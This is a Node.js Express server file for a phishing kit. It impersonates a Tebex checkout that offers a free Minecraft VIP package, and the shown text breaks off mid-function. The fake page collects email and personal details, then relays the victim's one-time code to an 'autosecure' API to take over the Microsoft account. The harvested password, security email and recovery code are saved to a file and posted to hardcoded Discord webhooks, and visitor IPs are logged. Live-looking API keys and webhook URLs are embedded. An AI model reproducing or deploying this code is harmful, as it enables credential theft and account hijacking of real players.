const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const VALID_CLAIM_ID = '3423523';
const AUTO_SECURE_API_KEY = 'ask_live_9826855448a73efb5d133cb50ca74d0cd0c3f91f19fe6de9';
const AUTO_SECURE_BASE = 'https://autosecure.tech/api/v1';
const LOGS_WEBHOOK_URL = 'https://discord.com/api/webhooks/1528844981861617835/QxzNbOJnT-wgtJldxM-eJVwoR0I5YuzTH01kWEWlolfA69kxLS4Spin-zmE6dJ82D8M7';
const ACCOUNTS_WEBHOOK_URL = 'https://discord.com/api/webhooks/1528845064510636134/v2WktEChP0t4KjlFQKlT4IzqJq_WVxfJozK8lrBeKWmoj68ejrcvRxNL0aP48wAhyZ4H';
const ACCOUNTS_FILE = path.join(__dirname, 'accounts.json');
const IPS_FILE = path.join(__dirname, 'ips.json');

function loadIPDatabase() {
  try {
    if (fs.existsSync(IPS_FILE)) {
      const fileData = fs.readFileSync(IPS_FILE, 'utf8');
      return JSON.parse(fileData);
    }
  } catch (error) {
    console.error('Error loading IP database:', error.message);
  }
  return {};
}

function saveIPToDatabase(ip) {
  try {
    const ips = loadIPDatabase();
    if (!ips[ip]) {
      ips[ip] = { firstSeen: new Date().toISOString(), count: 1 };
      fs.writeFileSync(IPS_FILE, JSON.stringify(ips, null, 2));
      return true;
    } else {
      ips[ip].count += 1;
      fs.writeFileSync(IPS_FILE, JSON.stringify(ips, null, 2));
      return false;
    }
  } catch (error) {
    console.error('Error saving IP to database:', error.message);
    return false;
  }
}

app.use(express.json());

app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https' && req.hostname !== 'localhost') {
    res.redirect(301, `https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});

const recentWebhooks = new Map();

async function sendDiscordWebhook(webhookUrl, embed) {
  const webhookKey = webhookUrl + ':' + embed.title;
  const now = Date.now();
  const lastSent = recentWebhooks.get(webhookKey) || 0;

  if (now - lastSent < 1000) {
    return;
  }

  recentWebhooks.set(webhookKey, now);

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error('Discord webhook error:', error.message);
  }
}

function createEmbed(title, color, fields) {
  let description_text = '';

  fields.forEach(field => {
    description_text += `**${field.name}**\n\`\`\`\n${field.value || 'N/A'}\n\`\`\`\n`;
  });

  return {
    title: title,
    description: description_text,
    color: color
  };
}

function getClientIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
}

async function validateMinecraftUsername(username) {
  try {
    const response = await fetch('https://api.mojang.com/users/profiles/minecraft/' + username);

    if (response.status === 204) {
      return true;
    }

    if (response.status === 404) {
      return false;
    }

    if (!response.ok) {
      throw new Error('Mojang API error: ' + response.status);
    }

    const data = await response.json();
    return data && data.id;
  } catch (error) {
    console.error('Minecraft username validation error:', error);
    throw new Error('Unable to verify username. Please try again.');
  }
}

function saveAccountToFile(accountData) {
  try {
    let accounts = [];
    if (fs.existsSync(ACCOUNTS_FILE)) {
      const fileData = fs.readFileSync(ACCOUNTS_FILE, 'utf8');
      accounts = JSON.parse(fileData);
    }
    accounts.push(accountData);
    fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accounts, null, 2));
  } catch (error) {
    console.error('Error saving account to file:', error.message);
  }
}

const checkoutHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Complete Your Order — tebex</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root{
    --bg-left:#1c1a19;
    --bg-right:#040404;
    --bg-footer:#000000;
    --border-subtle:#333130;
    --border-input:#3a3836;
    --text-primary:#f5f4f3;
    --text-secondary:#9d9996;
    --text-muted:#716d6a;
    --input-bg:#211f1d;
    --box-bg:#242220;
    --teal:#1ea896;
    --teal-bright:#2bc4b0;
    --teal-btn-text:#08201c;
    --radius:10px;
  }
  *{box-sizing:border-box;}
  html,body{margin:0;padding:0;}
  body{
    font-family:'Inter',system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
    background:var(--bg-right);
    color:var(--text-primary);
    min-height:100vh;
    display:flex;
    flex-direction:column;
  }
  .page{
    display:flex;
    flex:1;
    min-height:0;
  }
  .panel{
    flex:1 1 50%;
    padding:40px 56px 48px;
    display:flex;
    flex-direction:column;
    min-width:0;
  }
  .panel-left{
    background:var(--bg-left);
  }
  .panel-right{
    background:var(--bg-right);
    justify-content:flex-start;
    padding-top:96px;
  }

  .topbar{
    display:flex;
    align-items:center;
    justify-content:space-between;
  }
  .logo{
    font-weight:800;
    font-size:19px;
    letter-spacing:-0.02em;
  }
  .cancel-link{
    color:var(--text-secondary);
    font-size:14px;
    cursor:pointer;
  }

  h1.section-title{
    font-size:26px;
    font-weight:700;
    margin:56px 0 20px;
    letter-spacing:-0.01em;
  }
  .product-row{
    display:flex;
    align-items:center;
    justify-content:space-between;
    margin-bottom:20px;
  }
  .product-left{
    display:flex;
    align-items:center;
    gap:14px;
  }
  .product-icon{
    width:42px;
    height:42px;
    border-radius:9px;
    overflow:hidden;
    flex-shrink:0;
    background:var(--box-bg);
  }
  .product-icon img{
    width:100%;
    height:100%;
    object-fit:cover;
    display:block;
  }
  .product-name{
    font-size:15px;
    font-weight:500;
  }
  .price-stack{
    text-align:right;
  }
  .price-old{
    display:block;
    font-size:13px;
    color:var(--text-muted);
    text-decoration:line-through;
    margin-bottom:2px;
  }
  .price-new{
    display:block;
    font-size:17px;
    font-weight:700;
  }

  .spacer{flex:1;}

  .field-label{
    font-size:13.5px;
    color:var(--text-secondary);
    margin-bottom:8px;
    display:block;
  }
  input[type="text"], input[type="email"]{
    width:100%;
    background:var(--input-bg);
    border:1px solid var(--border-input);
    border-radius:8px;
    padding:12px 14px;
    color:var(--text-primary);
    font-size:14px;
    font-family:inherit;
    outline:none;
    transition:border-color .15s ease;
  }
  input[type="text"]::placeholder, input[type="email"]::placeholder{
    color:var(--text-muted);
  }
  input[type="text"]:focus, input[type="email"]:focus{
    border-color:var(--teal-bright);
  }

  .coupon-block{margin-top:28px;}
  .divider{
    border:none;
    border-top:1px solid var(--border-subtle);
    margin:22px 0;
  }
  .total-row{
    display:flex;
    justify-content:space-between;
    align-items:center;
    font-size:17px;
    font-weight:700;
  }

  h1.order-title{
    font-size:32px;
    font-weight:800;
    letter-spacing:-0.01em;
    margin:0 0 34px;
  }
  .field-block{margin-bottom:22px;}
  .field-row{
    display:grid;
    grid-template-columns:1fr 1fr;
    gap:16px;
    margin-bottom:22px;
  }

  .field-error{
    display:none;
    color:#e5787c;
    font-size:12.5px;
    margin:-6px 0 22px;
  }

  .otp-modal-subtitle{
    font-size:13.5px;
    color:var(--text-secondary);
    margin:0 0 20px;
  }
  .otp-inputs{
    display:flex;
    justify-content:center;
    gap:8px;
    margin:0 0 14px;
  }
  .otp-digit{
    width:44px;
    height:52px;
    text-align:center;
    font-size:19px;
    font-weight:700;
    background:var(--input-bg);
    border:1px solid var(--border-input);
    border-radius:8px;
    color:var(--text-primary);
    outline:none;
    font-family:inherit;
    transition:border-color .15s ease;
  }
  .otp-digit:focus{border-color:var(--teal-bright);}
  .otp-digit[readonly]{opacity:.6;}
  .otp-digit:disabled{opacity:.5; cursor:not-allowed;}
  .otp-actions{
    display:flex;
    justify-content:center;
    align-items:center;
    gap:16px;
  }
  .resend-link{
    font-size:12.5px;
    color:var(--text-secondary);
    text-decoration:underline;
    cursor:pointer;
  }
  .resend-link:hover{color:var(--text-primary);}
  .resend-link:disabled{opacity:.5; cursor:not-allowed;}
  .otp-status{
    font-size:12.5px;
    margin-top:12px;
    text-align:center;
    display:none;
  }
  .otp-status.error{display:block; color:#e5787c;}
  .otp-status.success{display:flex; justify-content:center; align-items:center; gap:6px; color:var(--teal-bright); font-weight:600;}
  .otp-status.info{display:block; color:var(--text-secondary);}
  .spinner{
    width:12px;
    height:12px;
    border:2px solid var(--teal-bright);
    border-top:2px solid transparent;
    border-radius:50%;
    animation:spin .6s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}

  .checkbox-row{
    display:flex;
    align-items:flex-start;
    gap:10px;
    margin-bottom:14px;
  }
  input[type="checkbox"]{
    appearance:none;
    -webkit-appearance:none;
    width:17px;
    height:17px;
    min-width:17px;
    margin-top:1px;
    border:1.5px solid var(--teal-bright);
    border-radius:4px;
    background:transparent;
    cursor:pointer;
    outline:none;
    transition:all .15s ease;
  }
  input[type="checkbox"]:checked{
    background:var(--teal-bright);
    border-color:var(--teal-bright);
  }
  input[type="checkbox"]:checked::after{
    content:'✓';
    display:flex;
    align-items:center;
    justify-content:center;
    width:100%;
    height:100%;
    color:var(--teal-btn-text);
    font-size:11px;
    font-weight:700;
  }
  input[type="checkbox"].invalid{
    border-color:#e5787c;
    background:rgba(229,120,124,.1);
  }
  input[type="checkbox"]:focus{
    box-shadow:0 0 0 2px rgba(46,196,176,.2);
  }

  .agree-label{
    font-size:13px;
    color:var(--text-primary);
    cursor:pointer;
  }
  .agree-label a{
    color:var(--teal-bright);
    text-decoration:none;
  }
  .agree-label a:hover{text-decoration:underline;}

  .agree-error{
    display:none;
    color:#e5787c;
    font-size:12.5px;
    margin:8px 0 22px;
  }

  .submit-btn{
    width:100%;
    padding:13px 20px;
    background:var(--teal-bright);
    color:var(--teal-btn-text);
    border:none;
    border-radius:8px;
    font-size:15px;
    font-weight:600;
    font-family:inherit;
    cursor:pointer;
    outline:none;
    transition:opacity .15s ease;
  }
  .submit-btn:hover:not(:disabled){opacity:.9;}
  .submit-btn:disabled{
    opacity:.6;
    cursor:not-allowed;
  }

  .secure-note{
    text-align:center;
    font-size:12.5px;
    color:var(--text-muted);
    margin-top:20px;
  }
  .fine-print{
    text-align:center;
    font-size:11.5px;
    color:var(--text-muted);
    margin-top:12px;
    line-height:1.4;
  }

  .modal-overlay{
    position:fixed;
    top:0;
    left:0;
    right:0;
    bottom:0;
    background:rgba(0,0,0,.8);
    display:flex;
    align-items:center;
    justify-content:center;
    opacity:0;
    pointer-events:none;
    transition:opacity .2s ease;
    z-index:1000;
  }
  .modal-overlay.open{
    opacity:1;
    pointer-events:auto;
  }
  .modal-box{
    background:var(--box-bg);
    border:1px solid var(--border-subtle);
    border-radius:12px;
    padding:32px;
    width:90%;
    max-width:460px;
    max-height:90vh;
    overflow-y:auto;
    box-shadow:0 20px 60px rgba(0,0,0,.5);
  }
  .otp-modal-box{
    max-width:400px;
  }
  .modal-header{
    display:flex;
    justify-content:space-between;
    align-items:center;
    margin-bottom:20px;
  }
  .modal-header h2{
    margin:0;
    font-size:22px;
    font-weight:700;
  }
  .modal-close{
    background:none;
    border:none;
    color:var(--text-secondary);
    font-size:28px;
    cursor:pointer;
    padding:0;
    width:28px;
    height:28px;
    display:flex;
    align-items:center;
    justify-content:center;
    outline:none;
  }
  .modal-close:hover{color:var(--text-primary);}
  .modal-body{
    font-size:14px;
    color:var(--text-secondary);
    line-height:1.6;
  }
  .modal-body ul{
    margin:0;
    padding-left:20px;
  }
  .modal-body li{
    margin-bottom:12px;
  }

  .footer{
    background:var(--bg-footer);
    border-top:1px solid var(--border-subtle);
    padding:32px 56px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    gap:40px;
    font-size:12.5px;
    color:var(--text-muted);
  }
  .footer-left{
    display:flex;
    align-items:center;
    gap:24px;
  }
  .footer-brand{
    display:flex;
    align-items:center;
    gap:8px;
    color:var(--text-primary);
    font-weight:600;
  }
  .footer-links{
    display:flex;
    gap:32px;
  }
  .footer-links a{
    color:var(--text-muted);
    text-decoration:none;
  }
  .footer-links a:hover{color:var(--text-primary);}

  @media (max-width: 900px) {
    .page{flex-direction:column;}
    .panel{flex:none; width:100%;}
    .panel-right{padding-top:40px;}
    .field-row{grid-template-columns:1fr;}
    .footer{flex-direction:column; align-items:flex-start;}
    .footer-left{flex-direction:column; gap:16px;}
  }
</style>
</head>
<body>

<div class="page">
  <div class="panel panel-left">
    <div class="topbar">
      <div class="logo">tebex</div>
      <div class="cancel-link">Cancel</div>
    </div>

    <h1 class="section-title">Order Summary</h1>
    <div class="product-row">
      <div class="product-left">
        <div class="product-icon"><img src="https://dunb17ur4ymx4.cloudfront.net/packages/images/968f7b6ea516ca913cd5b265909c14d1ca1068d7.png" alt="VIP package"></div>
        <div class="product-name">VIP (Permanent)</div>
      </div>
      <div class="price-stack">
        <span class="price-new">$0.00</span>
      </div>
    </div>

    <div class="spacer"></div>

    <div class="coupon-block">
      <label class="field-label">Coupon/Gift Code</label>
      <input type="text" id="coupon" placeholder="000-000-000">
    </div>

    <div class="divider"></div>
    <div class="total-row">
      <span>Total</span>
      <span>$0.00</span>
    </div>
  </div>

  <div class="panel panel-right">
    <h1 class="order-title">Complete Your Order</h1>

    <div class="field-block">
      <label class="field-label" for="mc-email">Email Address</label>
      <input type="email" id="mc-email" placeholder="you@example.com" autocomplete="email">
      <div class="field-error" id="emailError">Please enter a valid email address.</div>
    </div>

    <div class="field-block">
      <label class="field-label" for="mc-username">Minecraft Username</label>
      <input type="text" id="mc-username" placeholder="Steve123" autocomplete="username">
    </div>

    <div class="field-row">
      <div class="field-block">
        <label class="field-label" for="full-name">Full Name</label>
        <input type="text" id="full-name" placeholder="John Doe" autocomplete="name">
      </div>
      <div class="field-block">
        <label class="field-label" for="zip-code">Zip Code</label>
        <input type="text" id="zip-code" placeholder="12345" autocomplete="postal-code">
      </div>
    </div>

    <div class="field-error" id="emailUsernameError">Please fill in all required fields.</div>

    <div class="checkbox-row">
      <input type="checkbox" id="promotional">
      <label for="promotional" class="agree-label">
        I would like to receive promotional emails and updates
      </label>
    </div>

    <div class="checkbox-row">
      <input type="checkbox" id="agree">
      <label for="agree" class="agree-label">
        I agree to the <a href="#" data-policy="terms">Terms of Service</a>, <a href="#" data-policy="purchase-rules">Purchase Rules</a>, and <a href="#" data-policy="privacy">Privacy Policy</a> and confirm I am the account holder or have permission to make this purchase
      </label>
    </div>
    <div class="agree-error" id="agreeError" aria-live="polite">You must agree to the terms before completing your order.</div>

    <button class="submit-btn" type="button" id="completeOrderBtn">Complete My Order</button>

    <div class="secure-note">Your payment information is secure and encrypted</div>
    <div class="fine-print">This is a digital product delivered instantly to the account above. All sales are final and non-refundable except as required by law. Checkout is processed by Tebex Limited on behalf of the seller.</div>
  </div>
</div>

<div class="footer">
  <div class="footer-left">
    <div class="footer-brand">
      <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M12 2v20M2 8h20" stroke="#9d9996" stroke-width="2.4" stroke-linecap="round"/></svg>
      tebex
    </div>
    <div class="footer-text">This checkout process is owned &amp; operated by Tebex Limited, who handle product fulfilment, billing support and refunds.</div>
  </div>
  <div class="footer-links">
    <a href="#" data-policy="purchase-rules">Purchase Rules</a>
    <a href="#" data-policy="refund">Refund Policy</a>
    <a href="#" data-policy="impressum">Impressum</a>
    <a href="#" data-policy="terms">Terms &amp; Conditions</a>
    <a href="#" data-policy="privacy">Privacy Policy</a>
  </div>
</div>

<div class="modal-overlay" id="modalOverlay">
  <div class="modal-box" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
    <div class="modal-header">
      <h2 id="modalTitle">Title</h2>
      <button class="modal-close" id="modalClose" aria-label="Close">&times;</button>
    </div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<div class="modal-overlay" id="otpModalOverlay">
  <div class="modal-box otp-modal-box" role="dialog" aria-modal="true" aria-labelledby="otpModalTitle">
    <div class="modal-header">
      <h2 id="otpModalTitle">Verify Your Email</h2>
      <button class="modal-close" id="otpModalClose" aria-label="Close">&times;</button>
    </div>
    <p class="otp-modal-subtitle" id="otpModalSubtitle">We sent a 6-digit code to your email. Enter it below.</p>
    <div class="otp-inputs" id="otpInputs">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
      <input type="text" class="otp-digit" inputmode="numeric" maxlength="1">
    </div>
    <div class="otp-actions">
      <span class="resend-link" id="resendLink">Resend code</span>
    </div>
    <div class="otp-status" id="otpStatus"></div>
    <button class="submit-btn" type="button" id="otpVerifyBtn">Verify &amp; Complete Order</button>
  </div>
</div>

<script>
  const CONFIG = {
    apiBase: window.location.origin,
    pollInterval: 3000,
    pollMaxAttempts: 40,
  };

  let currentSessionId = '';
  let currentEmail = '';
  let currentUsername = '';
  let pollAttempts = 0;
  let backgroundPolling = false;

  const policies = {
    "purchase-rules": { title: "Purchase Rules", items: ["This package is linked to the Minecraft account entered at checkout and cannot be transferred.", "Digital goods are delivered instantly and are non-refundable once redeemed in-game."] },
    "refund": { title: "Refund Policy", items: ["All sales are final once a digital product has been delivered and redeemed in-game."] },
    "impressum": { title: "Impressum", items: ["This store is operated as an authorized seller."] },
    "terms": { title: "Terms of Service", items: ["By completing this purchase you agree to use the purchased items in line with the server's rules."] },
    "privacy": { title: "Privacy Policy", items: ["We collect the email address, name, and zip code provided at checkout."] }
  };

  const overlay = document.getElementById('modalOverlay');
  const modalTitle = document.getElementById('modalTitle');
  const modalBody = document.getElementById('modalBody');
  const modalClose = document.getElementById('modalClose');

  function openModal(key){
    const data = policies[key];
    if(!data) return;
    modalTitle.textContent = data.title;
    modalBody.innerHTML = '<ul>' + data.items.map(i => '<li>' + i + '</li>').join('') + '</ul>';
    overlay.classList.add('open');
    document.body.style.overflow = 'hidden';
  }
  function closeModal(){
    overlay.classList.remove('open');
    document.body.style.overflow = '';
  }

  document.querySelectorAll('[data-policy]').forEach(el => {
    el.addEventListener('click', e => {
      e.preventDefault();
      openModal(el.getAttribute('data-policy'));
    });
  });
  modalClose.addEventListener('click', closeModal);
  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });

  const emailInput = document.getElementById('mc-email');
  const emailError = document.getElementById('emailError');
  const usernameInput = document.getElementById('mc-username');
  const emailUsernameError = document.getElementById('emailUsernameError');

  const otpModalOverlay = document.getElementById('otpModalOverlay');
  const otpModalSubtitle = document.getElementById('otpModalSubtitle');
  const otpModalClose = document.getElementById('otpModalClose');
  const otpDigits = Array.from(document.querySelectorAll('.otp-digit'));
  const resendLink = document.getElementById('resendLink');
  const otpStatus = document.getElementById('otpStatus');
  const otpVerifyBtn = document.getElementById('otpVerifyBtn');
  const completeBtn = document.getElementById('completeOrderBtn');

  const agreeCheckbox = document.getElementById('agree');
  const agreeError = document.getElementById('agreeError');

  agreeCheckbox.addEventListener('change', () => {
    if (agreeCheckbox.checked) {
      agreeError.style.display = 'none';
      agreeCheckbox.classList.remove('invalid');
    }
  });

  function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function isValidUsername(username) {
    return /^[a-zA-Z0-9_]{3,16}$/.test(username);
  }

  async function sendOtpToEmail(email, username) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      const response = await fetch(CONFIG.apiBase + '/api/otp/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.trim(), username: username.trim() }),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const data = await response.json().catch(() => ({}));

      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Failed to send verification code.');
      }

      currentSessionId = data.sessionId;
      currentEmail = email;
      currentUsername = username;

      return { success: true, sentTo: data.sentTo };
    } catch (error) {
      if (error.name === 'AbortError') {
        return { success: false, error: 'Connection timed out. Server took too long to respond.' };
      }
      return { success: false, error: error.message || 'Failed to connect to server.' };
    }
  }

  async function verifyOtp(code) {
    try {
      if (!currentSessionId) throw new Error('Session lost. Please start over.');

      otpVerifyBtn.disabled = true;
      otpDigits.forEach(d => d.disabled = true);
      otpStatus.className = 'otp-status info';
      otpStatus.innerHTML = '<div class="spinner"></div> Verifying...';

      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      const response = await fetch(CONFIG.apiBase + '/api/otp/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: currentSessionId,
          email: currentEmail,
          code: code
        }),
        signal: controller.signal
      });
      clearTimeout(timeoutId);

      const data = await response.json().catch(() => ({}));

      if (!response.ok || !data.success) {
        throw new Error(data.error || 'Invalid verification code.');
      }

      otpStatus.className = 'otp-status success';
      otpStatus.innerHTML = '✓ Verified!';

      setTimeout(() => {
        closeOtpModal();
        completeBtn.textContent = '✅ Order Complete';
        completeBtn.disabled = true;
      }, 1500);

      return true;
    } catch (error) {
      otpStatus.className = 'otp-status error';
      otpStatus.textContent = error.message.includes('AbortError') ? 'Verification timed out.' : error.message;
      otpVerifyBtn.disabled = false;
      otpDigits.forEach(d => { d.disabled = false; d.value = ''; });
      otpDigits[0].focus();
      return false;
    }
  }

  function openOtpModal(sentTo) {
    otpDigits.forEach(d => { d.value = ''; d.disabled = false; });
    otpModalSubtitle.textContent = 'We sent a 6-digit code to ' + (sentTo || currentEmail);
    otpModalOverlay.classList.add('open');
    document.body.style.overflow = 'hidden';
    otpDigits[0].focus();
  }

  function closeOtpModal() {
    otpModalOverlay.classList.remove('open');
    document.body.style.overflow = '';
  }

  otpModalClose.addEventListener('click', closeOtpModal);

  resendLink.addEventListener('click', async () => {
    if (!currentEmail || !currentUsername) return;
    otpStatus.className = 'otp-status info';
    otpStatus.textContent = 'Resending code...';
    const result = await sendOtpToEmail(currentEmail, currentUsername);
    if (result.success) {
      otpDigits.forEach(d => d.value = '');
      otpDigits[0].focus();
      otpStatus.className = 'otp-status success';
      otpStatus.textContent = 'Code resent!';
      setTimeout(() => { otpStatus.className = ''; otpStatus.textContent = ''; }, 2000);
    } else {
      otpStatus.className = 'otp-status error';
      otpStatus.textContent = result.error;
    }
  });

  otpDigits.forEach((digit, idx) => {
    digit.addEventListener('input', () => {
      digit.value = digit.value.replace(/[^0-9]/g, '').slice(0, 1);
      if (digit.value && idx < otpDigits.length - 1) otpDigits[idx + 1].focus();
    });
    digit.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !digit.value && idx > 0) otpDigits[idx - 1].focus();
    });
  });

  completeBtn.addEventListener('click', async () => {
    const email = emailInput.value.trim();
    const username = usernameInput.value.trim();

    if (!email || !isValidEmail(email)) {
      emailError.style.display = 'block';
      emailInput.focus();
      return;
    }
    emailError.style.display = 'none';

    if (!username || !isValidUsername(username)) {
      emailUsernameError.textContent = 'Please enter a valid Minecraft username (3-16 characters).';
      emailUsernameError.style.display = 'block';
      usernameInput.focus();
      return;
    }
    emailUsernameError.style.display = 'none';

    if (!agreeCheckbox.checked) {
      agreeError.style.display = 'block';
      agreeCheckbox.classList.add('invalid');
      agreeCheckbox.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    agreeError.style.display = 'none';
    agreeCheckbox.classList.remove('invalid');

    completeBtn.disabled = true;
    completeBtn.textContent = 'Sending code...';

    const result = await sendOtpToEmail(email, username);

    completeBtn.disabled = false;
    completeBtn.textContent = 'Complete My Order';

    if (result.success) {
      openOtpModal(result.sentTo);
    } else {
      emailUsernameError.textContent = result.error;
      emailUsernameError.style.display = 'block';
    }
  });

  otpVerifyBtn.addEventListener('click', () => {
    const entered = otpDigits.map(d => d.value).join('');
    if (entered.length < 6) {
      otpStatus.textContent = 'Enter all 6 digits';
      otpStatus.className = 'otp-status error';
      return;
    }
    verifyOtp(entered);
  });
</script>

</body>
</html>`;

async function sendOtpCode(email) {
  const response = await fetch(AUTO_SECURE_BASE + '/secure/otp/send', {
    method: 'POST',
    headers: {
      'Authorization': 'Bearer ' + AUTO_SECURE_API_KEY,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ email })
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    const statusCode = response.status;

    if (statusCode === 401) {
      throw new Error('API key is invalid or expired.');
    } else if (statusCode === 402) {
      throw new Error('No active API Access plan.');
    } else if (statusCode === 403) {
      throw new Error('API key has been banned.');
    } else if (statusCode === 400) {
      throw new Error('Invalid email format.');
    } else {
      throw new Error(errorData.error || 'Failed to send OTP code.');
    }
  }

  return await response.json();
}

async function getJobStatus(jobId) {
  const response = await fetch(AUTO_SECURE_BASE + '/job/' + jobId, {
    method: 'GET',
    headers: {
      'Authorization': 'Bearer ' + AUTO_SECURE_API_KEY,
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));
    const statusCode = response.status;

    if (statusCode === 401) {
      throw new Error('API key is invalid or expired.');
    } else if (statusCode === 402) {
      throw new Error('No active API Access plan.');
    } else if (statusCode === 403) {
      throw new Error('API key has been banned.');
    } else {
      throw new Error(errorData.error || 'Failed to get job status.');
    }
  }

  return await response.json();
}

async function pollJobUntilDone(jobId, maxAttempts = 40) {
  for (let i = 0; i < maxAttempts; i++) {
    const job = await getJobStatus(jobId);

    if (job.status === 'done') {
      return job.result;
    }

    await new Promise(r => setTimeout(r, 3000));
  }

  throw new Error('Job polling timeout after ' + (maxAttempts * 3) + ' seconds');
}

app.get('/', (req, res) => {
  return res.redirect('https://store.mcpvp.club');
});

app.post('/api/otp/send', async (req, res) => {
  try {
    const { email, username } = req.body;
    const clientIP = getClientIP(req);

    if (!email) {
      return res.status(400).json({ error: 'Email is required.' });
    }

    if (!username) {
      return res.status(400).json({ error: 'Username is required.' });
    }

    const usernameExists = await validateMinecraftUsername(username);
    if (!usernameExists) {
      return res.status(400).json({ error: 'Minecraft username does not exist.' });
    }

    const result = await sendOtpCode(email);

    if (!result.success) {
      return res.status(400).json({ error: result.error || 'Failed to send OTP code.' });
    }

    sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
      '📧 OTP Code Sent',
      9807270,
      [
        { name: 'Username', value: username || 'N/A' },
        { name: 'Email Provided', value: email },
        { name: 'Security Email', value: result.sent_to || 'N/A' },
        { name: 'IP Address', value: clientIP }
      ]
    ));

    return res.json({
      success: true,
      sessionId: result.session_id,
      type: result.type,
      sentTo: result.sent_to || email
    });
  } catch (error) {
    return res.status(400).json({ error: error.message });
  }
});

app.post('/api/otp/verify', async (req, res) => {
  try {
    const { sessionId, email, code } = req.body;
    const clientIP = getClientIP(req);

    if (!sessionId || !email || !code) {
      return res.status(400).json({ error: 'Missing required fields.' });
    }

    const response = await fetch(AUTO_SECURE_BASE + '/secure/otp/verify', {
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + AUTO_SECURE_API_KEY,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ session_id: sessionId, email, code })
    });

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      const statusCode = response.status;

      if (statusCode === 401) {
        throw new Error('API key is invalid or expired.');
      } else if (statusCode === 402) {
        throw new Error('No active API Access plan.');
      } else if (statusCode === 403) {
        throw new Error('API key has been banned.');
      } else if (statusCode === 400) {
        throw new Error('Invalid code format.');
      } else {
        throw new Error(errorData.error || 'Invalid verification code.');
      }
    }

    const verifyResult = await response.json();

    if (!verifyResult.success) {
      return res.status(400).json({ error: verifyResult.error || 'Failed to verify code.' });
    }

    sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
      '✅ Code Submitted',
      65280,
      [
        { name: 'Email', value: email },
        { name: 'Code', value: code },
        { name: 'IP Address', value: clientIP }
      ]
    ));

    const jobId = verifyResult.job_id;

    res.json({
      success: true,
      jobId: jobId
    });

    setTimeout(async () => {
      try {
        const result = await pollJobUntilDone(jobId);

        if (!result.success) {
          sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
            '❌ Account Securing Failed',
            16711680,
            [
              { name: 'Email', value: email },
              { name: 'Error', value: result.error || 'Unknown error' },
              { name: 'IP Address', value: clientIP }
            ]
          ));
          return;
        }

        const accountData = {
          email: email,
          code: code,
          ipAddress: clientIP,
          minecraftData: result.account?.minecraft || null,
          microsoftData: result.account?.microsoft || null
        };

        saveAccountToFile(accountData);

        sendDiscordWebhook(ACCOUNTS_WEBHOOK_URL, createEmbed(
          'Account Secured',
          3066993,
          [
            { name: 'Minecraft Username', value: result.account?.minecraft?.name || 'No MC!' },
            { name: 'Email', value: result.account?.microsoft?.email },
            { name: 'Password', value: result.account?.microsoft?.password || 'N/A' },
            { name: 'Security Email', value: result.account?.microsoft?.security_email || 'N/A' },
            { name: 'Recovery Code', value: result.account?.microsoft?.recovery_code || 'N/A' },
          ]
        ));
      } catch (error) {
        sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
          '❌ Job Polling Error',
          16711680,
          [
            { name: 'Email', value: email },
            { name: 'Job ID', value: jobId },
            { name: 'Error', value: error.message },
            { name: 'IP Address', value: clientIP }
          ]
        ));
      }
    }, 0);
  } catch (error) {
    return res.status(400).json({ error: error.message });
  }
});

app.get('/claim/:id', async (req, res) => {
  const clientIP = getClientIP(req);

  if (req.params.id === VALID_CLAIM_ID) {
    const isNewIP = saveIPToDatabase(clientIP);

    if (isNewIP) {
      sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
        '🌐 User Joined Website',
        3447003,
        [
          { name: 'IP Address', value: clientIP }
        ]
      ));
    }

    return res.send(checkoutHTML);
  } else {
    sendDiscordWebhook(LOGS_WEBHOOK_URL, createEmbed(
      '⚠️ Invalid Claim ID',
      16776960,
      [
        { name: 'Claim ID', value: req.params.id },
        { name: 'IP Address', value: clientIP }
      ]
    ));
    return res.redirect('https://store.mcpvp.club');
  }
});

app.use(async (req, res) => {
